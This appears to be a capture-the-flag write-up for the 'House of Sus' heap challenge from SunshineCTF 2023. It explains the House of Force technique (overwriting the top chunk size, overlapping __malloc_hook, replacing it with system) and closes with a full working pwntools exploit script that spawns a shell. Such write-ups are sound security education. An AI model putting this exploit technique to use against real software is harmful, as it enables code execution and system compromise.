## Level: Easy

    TLDR: create a chunk and overwrite the wilderness with a very large number due to an overflow. This will overlap the target address and resulting in write-what-where, which you can use it to overwrite malloc_hook with system to get a shell.  
  
### Checksec

![checksec](https://github.com/user-attachments/assets/b1f5f164-7791-4db8-80d0-da2e3aeca2af)

### Challenge
  
![menu](https://github.com/user-attachments/assets/24c5f22c-227d-488b-9446-7efe84d7e67e)

Very cool menu :D
We have a heap and a libc leak (option 2).

Also there is an overflow in option 3 so we can create a chunk then overwrite the wilderness (the top chunk's size) with a very large number (e.g. -1). This will make sure that malloc won't use `mmap` for any further allocations because it will think the top chunk has always *enough* space. And this will result in overlapping target address (write-what-where). 

### Approach 

```
1 - Use the overflow in `[3] Call an emergency meeting` to overwrite the wilderness with a very large number.
```

![newwilderness](https://github.com/user-attachments/assets/47fb63ae-68a5-46e8-b76c-bf89da5d1922)

```
2 - Calculate the address of wilderness and the target from the leaks
3 - Allocate a chunk with size of target - top_addr - 0x10 # for metadata
```

![overlapsize](https://github.com/user-attachments/assets/2cb9e4e7-8221-4398-a75d-f3bbffa74f19)


```
4 - Overwrite malloc_hook pointer (the target address) with system
```

![systemoverwrite](https://github.com/user-attachments/assets/f5518ba2-59f8-4808-99ed-6df30c7f0f5e)

```
5 - Call malloc with the address of "/bin/sh" as size to get a shell
```

![flag](https://github.com/user-attachments/assets/bc4a5ea9-72a6-487b-88b8-03b28a7dc0ef)


Calculating the offset for distance was quite painful until I get the hang of it. As always, following sources helped me understand this **House of Force** technique and eventually solve the challenge:

House of force: https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#house-of-force

More about the house: https://book.hacktricks.xyz/binary-exploitation/libc-heap/house-of-force

c0nrad's writeup: https://youtu.be/qA6ajf7qZtQ?t=2277

offical(i guess) write up: https://github.com/SunshineCTF/SunshineCTF-2023-Public/blob/main/Pwn/House_of_Sus/house_of_sus_exp.py

get the challenge from: https://github.com/SunshineCTF/SunshineCTF-2023-Public/tree/main/Pwn/House_of_Sus

Thank you to all of them and the author for this cool challenge!

### Full Exploit
```python
#!/usr/bin/env python

from pwn import *
import time
"""
p = gdb.debug("./house_of_sus_patched", gdbscript='''
    c
''')
"""
p = process("./house_of_sus_patched")

def emergency_meeting(size, response, imposter):
    p.sendline(b"3")
    p.recvuntil(b"tasks >:(\n\n")
    p.sendline(str(size).encode('utf-8'))
    time.sleep(0.5)
    p.sendline(response)
    
    time.sleep(0.5)
    p.sendline(str(imposter).encode('utf-8'))

def do_task():
    p.sendline(b"1")

def report_body(imposter):
    p.sendline(b"2")
    p.recvuntil(b"the seed: ")
    libc_leak = int(p.recvline().strip())
    print("LIBC LEAK:" + hex(libc_leak))
    time.sleep(0.5)
    p.sendline(str(imposter).encode('utf-8'))
    return libc_leak

p.recvuntil(b"joining game: ")

heap_leak = int(p.recvline().strip(), 16)
print("HEAP LEAK: " + hex(heap_leak))

# libc leak thanks to seed in report_body option
p.recvuntil(b"emergency meeting\n\n")
libc_leak = report_body(1)

libc_base = libc_leak - 279440
malloc_hook = libc_base + 4111408
system = libc_base + 324640
binsh = libc_base + 1785224

print("malloc_hook: " + hex(malloc_hook))
print("binsh: " + hex(binsh))

# overwrite the wilderness with "-1"
# so it will overlap the target on the next malloc 
payload = b"A" * 40
payload += p64(0xFFFFFFFFFFFFFFFF)
p.recvuntil(b"emergency meeting\n\n")
emergency_meeting(40, payload, 1)

# calculate where the top chunk size (the wilderness) is 
heap_addr = heap_leak + 88 + 4112

# calculate the distance for malloc_hook
# allocate a chunk with a size of to the distance for malloc_hook
distance = malloc_hook - heap_addr - 0x10  # 0x10 for the metadata 
payload = b"B" * 8
p.recvuntil(b"emergency meeting\n\n")
emergency_meeting(distance, payload, 1)

# overwrite malloc_hook pointer with system
payload = p64(system)
payload += b"C" * 8
p.recvuntil(b"emergency meeting\n\n")
emergency_meeting(30, payload, 1)

# call malloc with "/bin/sh" in size
payload = b'whoami'
binsh = int(binsh)
p.recvuntil(b"emergency meeting\n\n")
emergency_meeting(binsh, payload, 1)

p.interactive()
```
<p align="center">
<img src=https://media1.tenor.com/m/-POqhuRZuEUAAAAd/easy-mode-shinoa-shinoa.gif>
</p>
